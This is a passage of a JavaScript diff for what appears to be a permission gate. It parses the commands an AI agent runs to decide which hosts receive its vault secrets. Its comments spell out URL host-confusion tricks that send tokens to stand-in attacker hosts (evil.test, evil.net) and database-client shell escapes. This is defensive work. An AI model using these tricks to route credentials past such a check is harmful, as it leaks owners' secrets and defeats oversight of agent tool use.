TYPEs as a repository (repoValues — repo create --template, the inherited -R) — the agent's own gh (issue list, pr merge, repo view, api) stays ok:own while an unknown or relocated spelling asks. grammar + grammarVersion are GENERATED (node scripts/gen-gh-grammar.mjs --write, pinned to the runner's gh); ⑤c re-parses the whole live tree IN PARALLEL and diffs the version AND the table — any drift RED by name. gh api <path> is a path under the default host, never a host   // round 2b: these drive `git` (the project's .git/config + hooks, like the git row); args after `--` go to git. ROUND 7: a dash-before-verb / unknown / extension verb still BLINDS, but a verb the help PROVES reaches only the default host is listed {default:1} and runs ok:own (no FALSE blind); a positional or value the help TYPEs OR DESCRIBES as a repository (incl. the scp-like git@HOST:O/R and ssh/git/http/https URLs, read by repoHostOf exactly as go-gh's repository.Parse) asks its host; the program-naming env vars (envHijack, DERIVED from `gh help environment`: GH_BROWSER/GH_EDITOR/GH_PAGER + the generic BROWSER/EDITOR/VISUAL/PAGER) are env_refused
+  { name: 'git', sub: 1, scpLike: true, proxyEnv: true, confDest: true, valueFlags: ['-C', '-c', '--git-dir', '--work-tree', '--namespace', '--config-env'], keyed: ['-c', '--config-env'] },
   { name: 'aws', hosts: ['*.amazonaws.com'], sub: 2, proxyEnv: true, valueFlags: ['--profile', '--region', '--output'] },
   { name: 'gcloud', hosts: ['*.googleapis.com'], sub: 3, proxyEnv: true, valueFlags: ['--project', '--account', '--format', '--configuration'] },
   { name: 'az', hosts: ['management.azure.com', 'login.microsoftonline.com'], sub: 2, proxyEnv: true, valueFlags: ['--subscription', '-g', '--resource-group', '-o', '--output'] },
   { name: 'npm', hosts: ['registry.npmjs.org'], sub: 1, proxyEnv: true, runsProject: true },
   { name: 'pip', hosts: ['pypi.org', 'files.pythonhosted.org'], sub: 1, proxyEnv: true, runsProject: true },
   { name: 'docker', hosts: ['registry-1.docker.io'], sub: 1, registry: true, proxyEnv: false, runsProject: true },
-  { name: 'kubectl', sub: 1, proxyEnv: true, valueFlags: ['-n', '--namespace', '--context', '--cluster', '--user', '-o', '--output', '-l', '--selector', '-f', '--filename', '-c', '--container', '--kubeconfig', '-s', '--server'], configFlags: ['--kubeconfig'] },
-  { name: 'psql', hostFlags: ['-h', '--host'], hostEnv: ['PGHOST', 'PGHOSTADDR'], proxyEnv: false },
-  { name: 'mysql', hostFlags: ['-h', '--host'], hostEnv: ['MYSQL_HOST'], proxyEnv: false },
-  { name: 'rclone', sub: 1, proxyEnv: true },
+  { name: 'kubectl', sub: 1, proxyEnv: true, hostFlags: ['-s', '--server'], valueFlags: ['-n', '--namespace', '--context', '--cluster', '--user', '-o', '--output', '-l', '--selector', '-f', '--filename', '-c', '--container', '--kubeconfig', '-s', '--server'], configFlags: ['--kubeconfig'] },
+  { name: 'psql', hostFlags: ['-h', '--host'], hostEnv: ['PGHOST', 'PGHOSTADDR'], conninfo: true, proxyEnv: false, prefixOpts: true, valueFlags: ['-c', '--command', '-f', '--file', '-d', '--dbname', '-o', '--output'], configFlags: ['-f', '--file'], scriptFlags: ['-c', '--command', '-o', '--output'], escapes: /^[\\|]/ },   // round 2: `-c '\! …'` is psql's shell (a -c starting with a backslash is a meta-command); `-o '|cmd'` pipes to a shell; a -f file may hold one
+  { name: 'mysql', hostFlags: ['-h', '--host'], hostEnv: ['MYSQL_HOST'], proxyEnv: false, prefixOpts: true, valueFlags: ['-e', '--execute'], configFlags: ['--defaults-file', '--defaults-extra-file', '--login-path'], scriptFlags: ['-e', '--execute'], escapes: /\\[!.]|\b(?:system|source)\b/i },   // round 2: the client's `system` / `\!` / `source`
+  { name: 'rclone', sub: 1, proxyEnv: true, confDest: true, valueFlags: ['--config'], configFlags: ['--config'] },
   { name: 'ssh', sshTarget: true, proxyEnv: false, valueFlags: SSH_VALUE_FLAGS, keyed: SSH_KEYED, configFlags: ['-F'] },
-  { name: 'sftp', sshTarget: true, proxyEnv: false, valueFlags: SSH_VALUE_FLAGS, keyed: SSH_KEYED, configFlags: ['-F'] },
+  { name: 'sftp', sshTarget: true, proxyEnv: false, valueFlags: SSH_VALUE_FLAGS, keyed: SSH_KEYED, configFlags: ['-F', '-b'] },   // round 2: -b = a batch file (its `!command` is a local shell)
   { name: 'scp', scpLike: true, copies: true, proxyEnv: false, valueFlags: SSH_VALUE_FLAGS, keyed: SSH_KEYED, configFlags: ['-F'] },
   { name: 'rsync', scpLike: true, copies: true, proxyEnv: false, valueFlags: ['-e', '--rsh'], keyed: ['-e', '--rsh'] },
 ].map((r) => Object.freeze({ argvOnly: false, ...r })));
@@ -293,6 +390,10 @@ const KNOWN_TOOLS = Object.freeze([
 const toolNameOf = (argv0, resolved = null) => String(resolved || argv0 || '').split(/[\\/]/).pop().toLowerCase().replace(/\.exe$/, '');
 const findIn = (list, n, key = (r) => r.names) => list.find((r) => key(r).includes(n)) || list.find((r) => key(r).includes(n.replace(/[\d.]+$/, ''))) || null;
 const knownToolOf = (name) => (name ? findIn(KNOWN_TOOLS, name, (r) => [r.name, ...(r.aka || [])]) : null);
+// round 7 (MAJOR 4): the union of every known tool's own program-naming env vars (gh's envHijack, GENERATED from its help) —
+// refused by name in envRefusedOf alongside the hand-kept cross-tool ENV_HIJACK (a belt). A GH_ name is namespaced, so a
+// machine-wide union is correct and the census pins the gh list against the live gh.
+const TOOL_ENV_HIJACK = Object.freeze(new Set(KNOWN_TOOLS.flatMap((r) => r.envHijack || [])));
 /** → { code, cls, name, words } | null. */
 function refusedTool(argv0, { resolved = null } = {}) {
   const name = toolNameOf(argv0, resolved);
@@ -350,7 +451,7 @@ function planOf(req = {}) {
   const claim = (n, as) => {
     if (!ENV_NAME.test(n)) return refuse('bad_env_name', { name: n });
     if (names.has(n)) return refuse('duplicate_name', { name: n });
-    const why = envRefusedOf(n, as);
+    const why = envRefusedOf(n, as, row);
     if (why) return refuse('env_refused', { name: n, why });
     names.add(n); return null;
   };
@@ -419,45 +520,267 @@ function materialize(run, { valueOf, pathOf }) {
 }
 
 // ── THE SHAPE KEY (decision ④) ──
-// lane vault-use-grants round 3 (BLOCKER): a URL's host is what the WHATWG URL parser (`new URL`) says — NOT a character
-// class. The old `[A-Za-z0-9.-]+` stopped at `_` `~` `|` and non-ASCII, so `https://example.com_.evil.net/` read as
-// example.com and a grant for example.com admitted it (the real curl sent Host: example.com_.evil.net). THE SEAM: this is
-// vault-agent-own r19's `urlParse` — at train-C import it; do not keep a second reader. URL_FIND_RE only LOCATES a token.
-const URL_FIND_RE = /\b([a-z][a-z0-9+.-]{0,31}):\/\/\S+/gi;   // scheme://… up to whitespace; the host is read by urlParse
-const URL_TRAIL = /[)\]>.,;'"]+$/;   // trailing punctuation the locator swept up
-const normHost = (h, port = null) => { const x = String(h || '').toLowerCase().replace(/^\[|\]$/g, '').replace(/\.$/, ''); return x && x.length <= 253 && !/[{}]/.test(x) && !x.split('.').some((l) => l.length > 63) ? (port ? `${x}:${port}` : x) : null; };   // a name > 253 or a label > 63 is not valid DNS; a `{{var}}` is never a host (fail closed)
-// lane vault-use-grants round 4 (BLOCKER): WHATWG «special schemes» treat `\` as `/`, so `new URL()` ends the authority
-// at a backslash — but curl / wget keep `host\` as USERINFO and connect to the host after the `@`. The reader must never try
-// to out-parse the tool: for a special scheme it reads a host ONLY from a CLEAN authority (a bare host[:port]); a `\`, a
-// userinfo `@`, a `%`-escape, whitespace or a non-ASCII byte in the authority makes curl route where new URL() does not —
-// the token is OPAQUE (the card, no «Always»). The seam: vault-agent-own r23's urlParse gets the SAME rule (its r24 addendum).
-const SPECIAL_SCHEME = /^(?:https?|ftp|ftps|ws|wss|gopher):$/i;
-/** A scheme://… token → { host, port?, userinfo } | { bad } (unparseable) | { opaque } (parses, but the tool may route
- *  elsewhere than new URL() reads — a special-scheme authority that is not a clean host). (Seam: vault-agent-own r23 urlParse.) */
+// round 18/19 (item 1+2 BLOCKER): a URL's host is what the tool's OWN parser says — the WHATWG `URL`, never a hand-written regex.
+// URL_RE's userinfo pattern stopped at a `'` / `"` so it read `https://ghe.example.test'@evil.test/…` as ghe.example.test while Go
+// and curl read evil.test. Round 19: the locator runs a URL token to WHITESPACE only (the shell already split argv; inside one word
+// nothing ends a URL — a `"`, `<`, `>` or backtick is LEGAL inside userinfo, which curl/wget/WHATWG read the host PAST), and
+// urlParse (new URL) is the ONE authority on the host. A URL with ANY http(s) userinfo is never a route (url_userinfo, judged on ROUTE
+// words only); a URL the WHATWG parser REJECTS (an out-of-range port, a non-DNS name, a label > 63 / a name > 253, an empty host, a
+// `{{var}}`) is a BLIND authority — bad_host at the door, never a dropped host (Go/curl would still dial it). The divergence corpus is
+// a DOOR-level fuzz leg (whole argv words → routeHosts / userinfo / blind, compared to new URL, Go's trace and curl's %{url.host}).
+const AUTHORITY_UNSAFE = /[\\%\u0000-\u0020\u007f]|[^\u0000-\u007f]/;   // round 24 (the ONE parser must agree with the TOOL, not the WHATWG spec; vault-use-grants r3, wire-proven curl 8.18 + a loopback listener): a byte the tool (curl / wget / git / go-gh) KEEPS in a URL authority but the WHATWG `new URL()` strips, IDNA-maps or re-reads — a `\` (WHATWG turns it into `/` so the real host hides after it as curl's userinfo), a percent-escape, any control / space (WHATWG strips an embedded tab / newline), DEL, or a non-ASCII byte. The reader is NOT certain where the tool connects ⇒ the authority is BLIND (bad_host), never a guessed host
+const URL_FIND_RE = /\b([a-z][a-z0-9+.-]{0,31}):\/\/[^ \t\n\r\f\v]+/gi;   // round 23 (the refuted finding, real + pre-existing): the token runs to ASCII whitespace ONLY — JS's \S stops at U+00A0/U+3000/U+2028/… so `http://own-host\u3000@evil` was read as own-host (no userinfo, not blind) while curl dials evil; a non-ASCII space now stays IN the token ⇒ urlParse rejects it (bad_host) / blindAuthority blinds it. The host is read by urlParse, never this regex
+const URL_TRAIL = /[),;!'"<>`]+$/;   // drop trailing prose terminators (a standalone argv token has none); the attack bytes are always mid-token (…<byte>@host/path), so a trailing strip never reopens the hole
+const normHost = (h, port = null) => { const x = String(h || '').toLowerCase().replace(/\.$/, ''); return x && x.length <= 253 && !/[{}]/.test(x) && !x.split('.').some((l) => l.length > 63) ? (port ? `${x}:${port}` : x) : null; };   // round 19 (item 1): a name > 253 chars or a label > 63 is not valid DNS (gh/curl still CONTACT it) — fail-CLOSED to bad_host; a `{{var}}` is never a host
+const GRAM_DEPTH = new WeakMap();   // round 7 (5b): the lead depth is the grammar's longest key (repo autolink create = 3 words), memoised per frozen grammar — never the constant row.sub (= 2, for blindSubs)
+const gramDepthOf = (g) => { let d = GRAM_DEPTH.get(g); if (d === undefined) { d = Math.max(1, ...Object.keys(g).map((k) => k.split(' ').length)); GRAM_DEPTH.set(g, d); } return d; };
+// round 7 (BLOCKER 2): a gh repository SPEC → the HOST gh resolves it to with go-gh's repository.Parse, or null for a default-host
+// form. Wire-proven on gh 2.102.0 (GH_DEBUG=api): a scheme URL ssh|git|git+ssh|git+https|http|https://[user@]HOST[:port]/… ; the
+// scp-like git@HOST:OWNER/REPO (go-gh's git.IsURL treats ONLY a git@ prefix as a URL — foo@HOST:… and HOST:OWNER/REPO are NOT
+// hosts, they fall to the default host); and [HOST/]OWNER/REPO (3 slash-parts ⇒ HOST, 2 ⇒ default). '' = a host-bearing spec
+// whose host is unreadable ⇒ the caller BLINDS; null = a default-host form.
+const repoHostOf = (raw) => {
+  const s = String(raw).trim();
+  const strip = (h) => normHost(String(h).replace(/^www\./i, ''));   // round 8 (MINOR 2): go-gh's RepoInfoFromURL trims a leading www. (wire-proven on 2.102.0 for the URL, the scp-like AND the HOST/OWNER/REPO forms) — www.HOST targets HOST, so a value minted --for www.HOST must NOT silently pass
+  if (/^(?:ssh|git\+ssh|git\+https|git|https?):\/\//i.test(s)) { const r = urlParse(s); return r.host ? (strip(r.host.replace(/:\d+$/, '')) || '') : ''; }   // round 19 (item 3): go-gh/Go url.Parse read the host after the LAST @ (ssh://x@ghe:1@evil.test → evil.test, not first-@ ghe); port dropped for the host identity; a userinfo http(s) spec is caught by url_userinfo
+  let m = /^git@([^/:]+):/i.exec(s);
+  if (m) return strip(m[1]) || '';
+  const p = s.split('/');
+  if (p.length >= 3) return strip(p[0]) || '';   // round 9 (BLOCKER): go-gh reads ANY 3-part first segment as the host and gh POSTs `Authorization: token …` there — a one-label `intranet/o/r` resolves on a search-domain network, an IPv6 literal `[fd00::1]/o/r` dials — so a 3-part spec host is read fail-CLOSED (the round-8 "looks like a host" gate that this reverts let a one-label / IPv6 host run ok:own with NO card). The REPO_DESC over-match that fed a mis-typed --branch here is fixed AT THE SOURCE (gen-gh-grammar.mjs REPO_NAME: --branch / --source-ref / --signer-workflow are NOT repoValues), so repoHostOf only ever sees a real spec
+  return null;
+};
+/** The WHATWG host of one URL token (scheme://…). { host, userinfo } (userinfo:true = a credential-carrying URL, never an http(s)
+ *  route) | { bad:true } (the WHATWG parser REJECTS the token: an out-of-range port, a non-DNS name, a label > 63 / a name > 253, an
+ *  empty host, a `{{var}}`). The one authority on a URL's host — no regex reads it; a rejected token is a BLIND authority (bad_host),
+ *  never a dropped host (Go/curl would still dial it). */
 function urlParse(token) {
   const t = String(token);
   let u; try { u = new URL(t); } catch { return { bad: true }; }
-  if (SPECIAL_SCHEME.test(u.protocol)) {
-    const m = /^[a-z][a-z0-9+.-]{0,31}:\/\/([^/?#]*)/i.exec(t);   // the RAW authority — up to the first ASCII `/`, `?` or `#` (NOT `\`)
-    const rawAuth = m ? m[1] : '';
-    if (/[\\@%]/.test(rawAuth) || /[^\x21-\x7e]/.test(rawAuth)) return { opaque: true };   // `\` / userinfo `@` / `%`-escape / space / non-ASCII ⇒ new URL() and curl disagree ⇒ fail closed
+  const i = t.indexOf('://');
+  if (i >= 0) {
+    const raw = /^[^/?#]*/.exec(t.slice(i + 3))[0];   // round 24: the authority the TOOL reads — to the first / ? #, NOT stopping at a `\` (that non-stop IS the divergence)
+    if (AUTHORITY_UNSAFE.test(raw)) return { bad: true };   // round 24: a byte curl keeps but WHATWG strips / IDNA-maps / re-reads ⇒ the host cannot be told
+    const at = raw.lastIndexOf('@'); let re;   // userinfo ends at the LAST @ (curl and WHATWG agree); re-parse the raw host-part ALONE and require new URL settled on the SAME host — both sides self-normalise case / a default port / a trailing dot, so this fires ONLY when the authority BOUNDARY moved (the `\@`, the un-decoded run WHATWG re-read elsewhere): a structural divergence, never a benign normalisation
+    try { re = new URL(u.protocol + '//' + raw.slice(at + 1)); } catch { return { bad: true }; }
+    if (re.host !== u.host) return { bad: true };
   }
-  const h = normHost(u.hostname, u.port || null);
-  if (!h) return { bad: true };
-  return { host: h, userinfo: !!(u.username || u.password) };
+  const h = normHost(u.hostname, u.port || null);   // the WHATWG host is read PAST the userinfo (`https://ghe'@evil.test` ⇒ evil.test), so a route still sees the real host
+  return h ? { host: h, userinfo: u.username !== '' || u.password !== '' } : { bad: true };   // userinfo = a credential-carrying URL (url_userinfo, http/https only); a non-http scheme (postgresql://user@h, ssh://git@h) carries a legit username and its host is read
 }
+/** Every host a URL names, read by the WHATWG parser. A URI host LIST (round 2: `postgresql://a:1,b/db`, `redis://h1,h2`) is split
+ *  on the authority's commas and each part is parsed on its own; a credential-carrying (userinfo) or unparseable token contributes
+ *  no host here (url_userinfo / bad_host name it at the door). */
 function urlHosts(text) {
   const out = []; let m; URL_FIND_RE.lastIndex = 0;
-  while ((m = URL_FIND_RE.exec(String(text)))) { if (m[1].toLowerCase() === 'vault') continue; const r = urlParse(m[0].replace(URL_TRAIL, '')); if (r.host) out.push(r.host); }
-  return out;
+  while ((m = URL_FIND_RE.exec(String(text)))) {
+    const scheme = m[1].toLowerCase(); if (scheme === 'vault') continue;
+    const token = m[0].replace(URL_TRAIL, '');
+    const auth = token.slice(scheme.length + 3).split(/[/?#]/)[0];
+    for (const part of auth.split(',')) { const r = urlParse(`${scheme}://${part.trim()}/`); if (r.host) out.push(r.host); }
+  }
+  return out.filter(Boolean);
 }
-/** Does any scheme://… token in `text` parse to an OPAQUE destination (a special-scheme authority the reader cannot be
- *  certain the tool routes to — the backslash/userinfo family)? (lane vault-use-grants round 4, BLOCKER.) */
-function urlOpaque(text) {
+/** round 19 (item 1 BLOCKER): a located scheme://… token the WHATWG parser REJECTS (out-of-range port, non-DNS name, empty host,
+ *  `{{var}}`) — a BLIND authority. On a ROUTE position (a gh <url>/<endpoint> positional) this must bad_host at the door, never be a
+ *  dropped host: gh drops a bad port and still CONTACTS the host, so the token vanishing from routeHosts leaked the token to it. */
+function urlHostsBad(text) {
   let m; URL_FIND_RE.lastIndex = 0;
-  while ((m = URL_FIND_RE.exec(String(text)))) { if (m[1].toLowerCase() === 'vault') continue; if (urlParse(m[0].replace(URL_TRAIL, '')).opaque) return true; }
+  while ((m = URL_FIND_RE.exec(String(text)))) {
+    const scheme = m[1].toLowerCase(); if (scheme === 'vault') continue;
+    const token = m[0].replace(URL_TRAIL, '');
+    const auth = token.slice(scheme.length + 3).split(/[/?#]/)[0];
+    if (auth.split(',').some((part) => urlParse(`${scheme}://${part.trim()}/`).bad)) return true;
+  }
   return false;
 }
+/** Does any http(s) URL token in the text carry userinfo (user[:pass]@host)? A credential-carrying URL is never a route — the door
+ *  refuses url_userinfo. Scoped to http/https: ssh / git / ftp legitimately carry userinfo (a `git@` remote, an ftp login). */
+function urlUserinfo(text) {
+  let m; URL_FIND_RE.lastIndex = 0;
+  while ((m = URL_FIND_RE.exec(String(text)))) { const s0 = m[1].toLowerCase(); if ((s0 === 'http' || s0 === 'https') && urlParse(m[0].replace(URL_TRAIL, '')).userinfo) return true; }
+  return false;
+}
+/** lane vault-use-grants round 4 (BLOCKER), folded at int361 onto the ONE parser: a scheme://… token whose authority the tool
+ *  may route elsewhere than any reader can tell (`\` before @, a %-escape, a space / control / non-ASCII byte — urlParse
+ *  answers `bad` for that family, r24) makes the run's route OPAQUE (the card, no «Always»). Userinfo is urlParse's (url_userinfo). */
+function urlOpaque(text) {
+  let m; URL_FIND_RE.lastIndex = 0;
+  while ((m = URL_FIND_RE.exec(String(text)))) { if (m[1].toLowerCase() === 'vault') continue; if (urlParse(m[0].replace(URL_TRAIL, '')).bad) return true; }
+  return false;
+}
+// lane vault-agent-own (round 2) — the hosts the table did not read and the tool still goes to
+const URL_AUTHORITY_RE = /\b([a-z][a-z0-9+.-]{0,31}):\/\/([^\/?#'"\t\n\r\f\v ]*)/gi;   // round 23 (the refuted finding): scheme through the authority, ending at `/?#'"` or ASCII whitespace ONLY — a non-ASCII whitespace (U+00A0/U+3000/…) stays in the authority so blindAuthority's non-ASCII test blinds it (JS's \s stopped the capture before it and read the host in front)
+/** round 2b (HIGH-1): curl and wget percent-decode the host, IDNA-map a non-ASCII host and read userinfo PAST a backslash —
+ *  so `good.com%2eevil.com`, `good.com。evil.com`, `good.com\@evil.com` all reach evil.com while URL_RE reads good.com. An
+ *  authority that holds a `%`, a `\` or a non-ASCII byte cannot be trusted ⇒ the shape is BLIND (its real host is unknown). */
+function blindAuthority(text) {
+  let m; URL_AUTHORITY_RE.lastIndex = 0;
+  while ((m = URL_AUTHORITY_RE.exec(String(text)))) if (m[1].toLowerCase() !== 'vault' && /[%\\]|[^\x00-\x7f]/.test(m[2])) return true;
+  return false;
+}
+const BARE_RE = /^(?:[^\s@\/\\?#]*@)?(\[[0-9a-f:.]+\]|[A-Za-z0-9](?:[A-Za-z0-9.-]{0,251}[A-Za-z0-9])?)?(?::(\d{0,5}))?(?:[\/?#]\S*)?$/i;
+/** A URL tool's target (curl / wget: every positional; httpie: its URL) → { host } (written without a scheme: `evil.example.com/x`,
+ *  httpie's `:3000` = localhost) | { unread: true } (a target whose hosts the shape cannot list: curl's glob `{a,b}` / `[1-9]`, a
+ *  bare number — an address too, `2130706433` = 127.0.0.1 —, a URL URL_RE cannot read) | {} (not a target: a header, a data word). */
+function targetOf(a, globs = false, strict = false) {
+  const s = String(a);
+  if (globs && /[{}]|\[(?![0-9a-f:.]+\])/i.test(s)) return { unread: true };
+  if (/^[a-z][a-z0-9+.-]{0,31}:\/\//i.test(s)) return urlHosts(s).length ? {} : { unread: true };
+  if (/^[a-z][a-z0-9+.-]{0,31}:(?:\/|[a-z])/i.test(s)) return { unread: true };   // round 25 (item 2, refuted-but-real, wire-proven curl 8.18): a scheme-shaped token that is NOT canonical scheme:// — curl accepts http:/HOST (one slash) / http:HOST and dials a host PAST the scheme word; the reader never reads «http» as a bare host (BARE_RE did) ⇒ fail closed (unread/blind). A host:port (evil.test:8080) is not scheme-shaped — a digit, not a `/` or a letter, follows the colon
+  const m = BARE_RE.exec(s);
+  if (!m || (!m[1] && m[2] == null)) return strict ? { unread: true } : {};   // round 3: for a network tool (bareHosts:'all') a positional that is not a readable target is UNREAD (blind), never silently ignored — curl IDNA-maps / percent-decodes good.com。evil.com
+  if (!m[1]) return { host: normHost('localhost', m[2] || null) };
+  if (/^[\d.]+$/.test(m[1]) && !/^\d{1,3}(?:\.\d{1,3}){3}$/.test(m[1])) return { unread: true };
+  return { host: normHost(m[1], m[2] || null) };
+}
+/** httpie: `http [METHOD] URL [items…]` — its one target. */
+const httpieTarget = (ps) => (ps.length >= 2 && /^[A-Za-z]+$/.test(ps[0]) ? [ps[1]] : ps.slice(0, 1));
+/** libpq's `host=` / `hostaddr=` (a connection string, `-d …`, a URI's `?host=`) → every host it names (a host LIST too). */
+const CONNINFO_HOST = /(?:^|[\s?&=]|^-d)(?:host|hostaddr)\s*=\s*(?:'((?:[^'\\]|\\.)*)'|([^\s&'"]+))/gi;
+function conninfoHosts(text) { const out = []; let m; CONNINFO_HOST.lastIndex = 0; while ((m = CONNINFO_HOST.exec(String(text)))) for (const h of String(m[1] != null ? m[1] : m[2]).split(',')) { const hh = h.trim(); if (/^(?:\/|%2f)/i.test(hh)) continue; out.push(normHost(hh)); } return out.filter(Boolean); }   // round 2b: a unix-socket path is local, not a network host
+const CONNINFO_URI = /^postgres(?:ql)?:\/\/[^#]*/i;
+function conninfoUriBlind(text) { const m = CONNINFO_URI.exec(String(text)); if (!m) return false; const q = m[0].indexOf('?'); return q >= 0 && m[0].slice(q).includes('%'); }   // round 3: a % in a conninfo URI's query = a libpq-decoded keyword (host / hostaddr / service) our reader cannot see
+/** round 4: is a boolean flag present in its TRUE sense in any pflag spelling — the long form, --flag=true (not =false / =0),
+ *  a short letter alone, a short letter inside a cluster of boolean letters (-dm / -md), or -x=true? gh's git-driving flags
+ *  spell short aliases (pr merge --delete-branch / -d; repo create --clone / -c, --push). */
+function boolFlagOn(argv, longs, shorts, grammar) {
+  const valueShorts = new Set(((grammar && grammar.value) || []).filter((f) => /^-[A-Za-z]$/.test(f)));   // round 5: the verb's value-taking short flags, from the generated grammar
+  const truthy = (val) => val == null || !/^(?:0|f|false)$/i.test(val);
+  for (const a of argv.slice(1)) {
+    if (a === '--') break;
+    if (a.startsWith('--') && a.length > 2) { const eq = a.indexOf('='); if (longs.includes(eq > 0 ? a.slice(0, eq) : a) && truthy(eq > 0 ? a.slice(eq + 1) : null)) return true; }
+    else if (a[0] === '-' && a.length > 1 && a[1] !== '-') {
+      const eq = a.indexOf('='), letters = eq > 0 ? a.slice(1, eq) : a.slice(1), clVal = eq > 0 ? a.slice(eq + 1) : null;   // round 5: in a cluster, pflag binds `=value` to the LAST letter only
+      for (let i = 0; i < letters.length; i++) {
+        const sh = '-' + letters[i];
+        if (valueShorts.has(sh)) break;   // a value short takes the REST of the cluster as its value — the later letters are not flags (pflag)
+        if (shorts.includes(sh) && truthy(i === letters.length - 1 ? clVal : null)) return true;   // a boolean git-driving short: set true (NoOptDefVal) unless it is the LAST letter and carries =false/=0
+      }
+    }
+  }
+  return false;
+}
+/** round 4: a curl / wget FILE flag (--cacert / --cert / --netrc-file / --hsts …) escapes the config-file blind ONLY when its
+ *  WHOLE value is a $VAULT_FILE{…} placeholder (for -E / --cert an optional :password after it — nothing else) whose entry the
+ *  agent did NOT author: an owner-store entry. A template (--file NAME=@…, the agent's own text) or an agent-scoped entry (the
+ *  agent put or minted the bytes) is the agent's own file ⇒ blind as any other config file; a $VAULT_FILE{…} inside a longer
+ *  path (./x/$VAULT_FILE{o}/ca.pem, $VAULT_FILE{o}/../ca.pem) is not a whole placeholder ⇒ blind. ROUND 5 (say the reason): a
+ *  MINTED own value is random printable text, never a usable cert / key / CA, so blinding it loses nothing legal — the exemption
+ *  admits ONLY an owner-store entry, and an agent-scoped placeholder (put OR minted) blinds. */
+function fileFlagExempt(f, v, run) {
+  const re = f === '-E' || f === '--cert' ? /^\$VAULT_FILE\{([^}]*)\}(?::.*)?$/ : /^\$VAULT_FILE\{([^}]*)\}$/;
+  const m = re.exec(String(v));
+  if (!m) return false;
+  const inner = m[1];
+  if (ENV_NAME.test(inner)) { const file = run.files.find((x) => x.name === inner); return !!file && file.template == null && file.ref != null && !agentScopeOf(parseRef(file.ref)); }
+  return !agentScopeOf(innerRef(inner));
+}
+/** round 17 (item 1): a config-file flag value the card renders IN FULL — a whole $VAULT_FILE{NAME} placeholder naming a
+ *  `--file NAME=@template` (the agent's own text, shown verbatim on the card) within the card render bound. A
+ *  $VAULT_FILE{store/row/field} (an owner-secret FILE, its bytes never shown), an opaque path, or a template past the
+ *  render bound is NOT shown ⇒ no «always» (the card cannot show what the tool reads). */
+function configTemplateShown(v, run) {
+  const m = /^\$VAULT_FILE\{([^}]*)\}$/.exec(String(v));
+  if (!m || !ENV_NAME.test(m[1])) return false;
+  const file = run.files.find((x) => x.name === m[1]);
+  return !!file && file.template != null && typeof file.text === 'string' && bytesOf(file.text) <= TEMPLATE_CARD_MAX;
+}
+/** round 18 (item 3): a curl config TEMPLATE the card shows in full can itself NEST another file — `config = "./b.cfg"`, or a
+ *  cacert / cert / key / netrc-file / alt-svc / cookie-jar / upload-file / data(@file) / output directive. The agent can rewrite
+ *  that nested file AFTER an «always» grant and route the value to a new host with no card. The template's own directives are
+ *  parsed for the row's declared file-reading keys; the FIRST one that names a file (or an @file) the card cannot show is
+ *  returned as `key value` (so the card names it). A curl config line is `[--]key[ =:]value`, `#` comments, quotes optional. */
+/** round 19 (item 4): curl's OWN config-file grammar (src/tool_parsecfg.c), pinned by the table test in test-vault-run §parseCfgLine:
+ *  skip leading whitespace; a line whose first non-space char is `#` is a comment; the option word runs to whitespace / `=` / `:`
+ *  (an optional leading `-`/`--` is stripped); one `=`/`:`/whitespace separates it from the parameter; a `"`-quoted parameter is read
+ *  with curl's escapes (\\, \", \t, \n, \r, \v) to the closing quote (the rest of the line — e.g. a trailing `# comment` — is
+ *  discarded); an unquoted parameter is the rest of the line, trailing whitespace trimmed. A single-letter option is case-SENSITIVE
+ *  (-K config vs -k insecure); a long option is matched case-insensitively (fail-closed). */
+function parseCfgLine(raw) {
+  const s = String(raw).replace(/^\uFEFF/, '');
+  let i = 0; while (i < s.length && /\s/.test(s[i])) i++;
+  if (i >= s.length || s[i] === '#') return { key: null, val: '' };
+  let j = i; while (j < s.length && !/\s/.test(s[j]) && s[j] !== '=' && s[j] !== ':') j++;
+  const key = s.slice(i, j).replace(/^-+/, '');
+  if (!key) return { key: null, val: '' };
+  while (j < s.length && /\s/.test(s[j])) j++;
+  if (s[j] === '=' || s[j] === ':') j++;
+  while (j < s.length && /\s/.test(s[j])) j++;
+  if (s[j] === '"') { let out = ''; j++; while (j < s.length && s[j] !== '"') { if (s[j] === '\\' && j + 1 < s.length) { const c = s[++j]; out += ({ n: '\n', t: '\t', r: '\r', v: '\v' })[c] || c; } else out += s[j]; j++; } return { key, val: out }; }
+  return { key, val: s.slice(j).replace(/\s+$/, '') };
+}
+/** a scheme-less (`evil.test/x`) or scheme (`https://evil.test/x`) URL value → its host(s); userinfo stripped. */
+function cfgBareOrUrl(v) {
+  const t = String(v).trim();
+  if (/^[a-z][a-z0-9+.-]{0,31}:\/\//i.test(t)) return urlHosts(t);
+  if (/^[a-z][a-z0-9+.-]{0,31}:(?:\/|[a-z])/i.test(t)) return [];   // round 25 (item 2): a scheme-shaped token that is not canonical scheme:// (http:/host, http:host) — the config twin of the argv hole; curl dials a host past the scheme, the reader never reads «http» as a bare host (cfgRouteHosts then blinds)
+  const hp = t.split(/[\/?#]/)[0].replace(/^[^@]*@/, '');
+  const h = AUTHORITY_UNSAFE.test(hp) ? null : normHost(hp);   // round 24: a `\` / % / space / non-ASCII in a scheme-less config host ⇒ blind (the same law urlParse keeps for scheme URLs)
+  return h ? [h] : [];
+}
+// round 25 (item 1, CONFIRMED 0.93): a route host token ([scheme://][user@]host[:port], cut at the first / ? # as curl does) read by the ONE parser (urlParse) — curl's host WITHOUT its port, or null (blind). No hand regex reads a route host any more: the old proxy / preproxy / socks branch read the host after the LAST @ and ignored #/? (`proxy = evil.test#@own.example:3128` named own.example while the real curl dialled evil.test — wire-proven on a loopback proxy, curl 8.18).
+function routeHostOne(raw) {
+  const t = String(raw).trim();
+  if (!t) return null;
+  const r = urlParse(/^[a-z][a-z0-9+.-]{0,31}:\/\//i.test(t) ? t : 'http://' + t);
+  return r.host ? r.host.replace(/:\d+$/, '') : null;   // the host without its port (a proxy / socks / resolve host is named; a port is not a host); an IPv6 literal stays bracketed ([::1])
+}
+// a connect-to / resolve field string split on ':' but NOT inside [ ] (an IPv6 literal `[::1]` holds colons)
+function colonFields(s) {
+  const out = []; let cur = '', depth = 0;
+  for (const ch of String(s)) {
+    if (ch === '[') { depth++; cur += ch; } else if (ch === ']') { depth = Math.max(0, depth - 1); cur += ch; }
+    else if (ch === ':' && depth === 0) { out.push(cur); cur = ''; } else cur += ch;
+  }
+  out.push(cur); return out;
+}
+/** a curl route directive's value → { hosts } | { blind:true } (a {{var}} host, a socket, an unparseable / unsafe authority) | { file:true } (url = @file). EVERY route value is read by the ONE parser (routeHostOne → urlParse), with a bracket-aware field split for the colon forms — no hand regex. */
